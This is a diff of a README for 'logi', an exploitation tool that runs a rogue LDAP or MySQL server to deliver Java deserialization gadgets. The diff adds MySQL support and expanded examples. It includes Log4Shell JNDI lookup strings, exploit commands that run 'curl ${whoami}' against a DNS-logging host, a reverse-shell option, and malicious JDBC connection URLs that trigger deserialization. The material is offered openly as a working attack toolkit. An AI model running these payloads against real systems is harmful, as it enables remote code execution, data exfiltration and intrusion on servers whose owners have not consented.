@@ -1,11 +1,13 @@
 # ☕️LOGI
-Logi is a ldap server focusing on ldap deserialize recon and exploit.
+Logi is a LDAP/MySQL server focusing on pingback deserialize recon and exploit.
 
 
 - [☕️LOGI](#️logi)
   - [✨Get started](#get-started)
   - [⚙️How it work](#️how-it-work)
   - [🚀Examples](#examples)
+    - [📖LDAP](#ldap)
+    - [🐬MySQL](#mysql)
   - [🔮Image](#image)
   - [💻See also](#see-also)
 
@@ -17,14 +19,15 @@ go install github.com/cokeBeer/logi/cmd/logi@latest
 Use `-h` to show help.
 ```
 $ ./logi -h
-Logi is a ldap server focusing on ldap deserialize recon and exploit.
+Logi is a LDAP/MySQL server focusing on pingback deserialize recon and exploit.
 
 Usage:
   ./logi [flags]
 
 Flags:
-MODE CONFIG:
-   -m, -mode int  1 for poc, 2 for probe, 3 for exploit
+BASIC CONFIG:
+   -m, -mode int  1 for poc , 2 for probe, 3 for exploit
+   -t, -type int  1 for ldap, 2 for mysql
 SERVE CONFIG:
    -i, -ip string    ip for binding (default "0.0.0.0")
    -p, -port string  port for binding (default "1389")
@@ -32,39 +35,84 @@ SERVE CONFIG:
 ```
 
 ## ⚙️How it work
-Logi hosts a ldap service, waiting for ldap lookup
+Logi hosts a LDAP/MySQL service, waiting for LDAP lookup/MySQL connect
 - poc mode: reply a urldns gadget points to `domain` for deserialize verify
 - probe mode: reply different probe gadgets points to `probename.domain` in turn for dependency probe
 - exploit mode: reply a gadget for command execute
 
 ## 🚀Examples
-Run poc mode with dns domain `dnslog.me`.
+### 📖LDAP
+**Poc mode**
+
+Run poc mode with dns domain `dnslog.me`:
+```
+./logi -t 1 -m 1 -d dnslog.me
+```
 You need to send a ldap lookup to logi.
+For example, a log4shell poc like below can trigger a jndi lookup to your server.
 ```
-./logi -m 1 -d dnslog.me
+${jndi:ldap://your-ip:your-port/somepath}
 ```
-Run probe mode with dns domain `dnslog.me` with embed wordlist `yso`.
-You need to request many times to traverse the wordlist.
+logi will send a response contains serialized payload. After target deserializes the payload, it will lookup a domain named `somepath.dnslog.me`. You can use this feature to confirm deserialize and mark targets.
+
+**Probe mode with embed wordlist**
+
+Run probe mode with dns domain `dnslog.me` with embed wordlist `yso`:
 ```
-./logi -m 2 -d dnslog.me -w yso
+./logi -t 1 -m 2 -d dnslog.me -w yso
 ```
-Run probe mode with dns domain `dnslog.me` with custom wordlist in `./dict.txt`.
-One class name per line.
+You need to request many times to traverse the wordlist, which can be done by BurpSuite.
 ```
-./logi -m 2 -d dnslog.me -wp ./dict.txt
+repeat ${jndi:ldap://your-ip:your-port/somepath} many times
 ```
-Run exploit mode with gadget `cb1v18`  with command `curl ${whoami}.dnslog.me`
+After target deserializes logi's response, it will lookup the domain `ith-classname.somepath.dnslog.me`. You can use this feature to probe dependencies. Also, the number of classes in dict will be printed to console when logi starts, you can use this information to control the repetition.
+
+**Probe mode with custom wordlist**
+
+Run probe mode with dns domain `dnslog.me` with custom wordlist in `./dict.txt`:
 ```
-./logi -m 3 -g cb1v18 -c 'curl ${whoami}.dnslog.me'
+./logi -t 1 -m 2 -d dnslog.me -wp ./dict.txt
 ```
-Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`
+One class name per line in dict.
+
+**Exploit mode with embed gadget**
+
+Run exploit mode with gadget `cb1v18`  with command `curl ${whoami}.dnslog.me`:
 ```
-./logi -m 3 -g cb1v18 -s '127.0.0.1:7777'
+./logi -t 1 -m 3 -g cb1v18 -c 'curl ${whoami}.dnslog.me'
 ```
-Run exploit mode with custom binary payload in `./cc1`
+**Exploit mode to get a reverse shell**
+
+Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`:
 ```
-./logi -m 3 -b ./cc1
+./logi -t 1 -m 3 -g cb1v18 -s '127.0.0.1:7777'
 ```
+**Exploit mode with custom gadget**
+
+Run exploit mode with custom binary payload in `./cc1`:
+```
+./logi -t 1 -m 3 -b ./cc1
+```
+
+### 🐬MySQL
+In MySQL type, a fake MySQL server will be started. Mode poc and mode probe also work the same as LDAP type, but logi mainly focuses on exploit mode.
+
+> it's ok just replace -t 1 with -t 2 in above commands
+
+Run exploit mode on port `3307` with gadget `cb1v18`  with command `curl ${whoami}.dnslog.me`:
+
+```
+./logi -t 2 -m 3 -p 3307 -g cb1v18 -c 'curl ${whoami}.dnslog.me'
+```
+You need to send a JBDC connect to logi.
+```
+jdbc:mysql://your-ip:your-port/someschema?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false
+```
+You can also remove the param `useSSL=false`， this will cause JDBC connecting on TLS, and logi supports TLS connection too :).
+```
+jdbc:mysql://your-ip:your-port/someschema?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+```
+
 ## 🔮Image
 ![image](image/logi.png)
 ![image](image/dnslog.png)
